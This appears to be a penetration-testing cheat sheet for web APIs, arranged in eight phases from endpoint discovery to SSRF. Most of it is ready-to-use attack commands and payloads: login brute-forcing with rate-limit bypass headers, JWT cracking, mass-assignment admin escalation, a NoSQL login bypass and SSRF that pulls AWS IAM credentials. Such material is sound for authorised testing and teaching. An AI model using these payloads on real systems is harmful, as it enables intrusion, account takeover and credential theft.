
### Phase 1 — API Discovery

```bash
# Crawl JS files for endpoints
katana -u https://target.com -jc -o endpoints.txt
linkfinder -i https://target.com/static/app.js -o cli

# Brute force endpoints
ffuf -w /wordlists/api-endpoints.txt \
     -u https://target.com/api/FUZZ \
     -mc 200,201,204,301,302,401,403

# Common doc paths
/swagger.json
/swagger-ui.html
/api-docs
/openapi.json
/graphql
/redoc

# Historical URLs
waybackurls target.com | grep "/api/" | sort -u
gau target.com | grep "api"
```

### Phase 2 — API Versioning Attacks

```bash
# Test every version
for v in v0 v1 v2 v3 v4 beta dev test internal old; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/users\n" \
  https://target.com/api/$v/users
done
```

Why old versions are goldmines:

```
v3 (current): Auth required, rate limited, input validated
v1 (old):     No auth, no rate limit, no input validation, returns more data
```

### Phase 3 — HTTP Method Testing

```bash
# Test all methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$method /api/users: "
  curl -s -o /dev/null -w "%{http_code}\n" \
       -X $method https://target.com/api/users \
       -H "Authorization: Bearer <token>"
done
```

**TRACE Method Attack:**

```bash
curl -X TRACE https://target.com/api/users \
     -H "Cookie: session=abc123"
# Server reflects everything including session cookie
```

**Method Override Bypass:**

```bash
# Server blocks DELETE
POST /api/user/123
X-HTTP-Method-Override: DELETE    ← Rails honors this
X-Method-Override: DELETE
```

### Phase 4 — Authentication & Authorization

**BOLA/IDOR:**

```bash
# You are user 100
GET /api/users/100/orders  → your orders (200)
GET /api/users/101/orders  → another user (should 403)
# If 200 = BOLA = critical
```

**Mass Assignment:**

```bash
POST /api/register
{
  "username": "hacker",
  "password": "pass123",
  "role": "admin",         ← mass assignment
  "isAdmin": true,
  "verified": true,
  "credits": 99999
}
```

**JWT Attacks:**

```bash
# Algorithm none attack — change alg to none, remove signature
# Algorithm confusion RS256 → HS256 — sign with public key
# Weak secret brute force
hashcat -a 0 -m 16500 <jwt> wordlist.txt

# JWT Tool
python3 jwt_tool.py <token> -T    # tamper
python3 jwt_tool.py <token> -X a  # alg confusion
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack
```

### Phase 5 — Input Validation

**NoSQL Injection (MongoDB):**

```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

**Parameter Pollution:**

```
GET /api/transfer?amount=100&to=victim&to=attacker
# PHP takes last → money goes to attacker
```

### Phase 6 — Rate Limiting & Race Conditions

```bash
# Test rate limiting
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://target.com/api/login \
  -d '{"username":"admin","password":"test'$i'"}'
done
# Should return 429 after threshold

# Rate limit bypass headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4

# Race condition — send simultaneous requests
curl ... &
curl ... &
wait
```

### Phase 7 — GraphQL

```bash
# Check introspection
POST /graphql
{"query": "{ __schema { types { name } } }"}

# Batching attack → bypass rate limit
[
  {"query": "mutation { login(user:'admin', pass:'pass1') }"},
  {"query": "mutation { login(user:'admin', pass:'pass2') }"}
  ...1000 more
]
# 1000 login attempts in one HTTP request
```

### Phase 8 — SSRF via API

```bash
POST /api/webhook
{ "url": "http://169.254.169.254/latest/meta-data/" }
# AWS metadata → gets IAM credentials

{ "url": "http://localhost/admin" }
# Internal admin panel

# Common SSRF parameters
url=, webhook=, callback=, redirect=, fetch=, load=, src=
```
